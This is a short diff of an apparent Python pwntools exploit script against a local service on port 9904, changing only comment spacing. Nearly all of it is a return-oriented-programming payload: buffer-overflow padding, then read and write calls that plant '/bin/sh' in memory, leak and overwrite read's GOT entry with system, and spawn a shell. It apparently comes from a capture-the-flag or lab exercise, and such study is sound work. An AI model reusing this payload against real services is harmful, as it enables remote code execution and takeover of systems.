@@ -93,10 +93,10 @@ len_binsh = len(binsh)
 p = remote("localhost", 9904)
 
 pay = "A"*140
-pay += p32(read_plt)+p32(PPPR)+p32(0)+p32(bss)+p32(len_binsh)	     #read(0, bss, 8)	 => Overwrite /bin/sh to bss
-pay += p32(write_plt)+p32(PPPR)+p32(1)+p32(read_got)+p32(4)	       #write(1, read_got, 4)  => printf read_got
-pay += p32(read_plt)+p32(PPPR)+p32(0)+p32(read_got)+p32(4)	       #read(0, read_got, 4)   => Overwrite system to read_got
-pay += p32(read_plt)+"ABCD"+p32(bss)				                       #read("ABCD", bss)  =>   system(bss)  =>  system("/bin/sh")
+pay += p32(read_plt)+p32(PPPR)+p32(0)+p32(bss)+p32(len_binsh)	    #read(0, bss, 8)	 => Overwrite /bin/sh to bss
+pay += p32(write_plt)+p32(PPPR)+p32(1)+p32(read_got)+p32(4)	    #write(1, read_got, 4)  => printf read_got
+pay += p32(read_plt)+p32(PPPR)+p32(0)+p32(read_got)+p32(4)	    #read(0, read_got, 4)   => Overwrite system to read_got
+pay += p32(read_plt)+"ABCD"+p32(bss)				    #read("ABCD", bss)  =>   system(bss)  =>  system("/bin/sh")
 
 print "Send Explot : %s" % pay
 
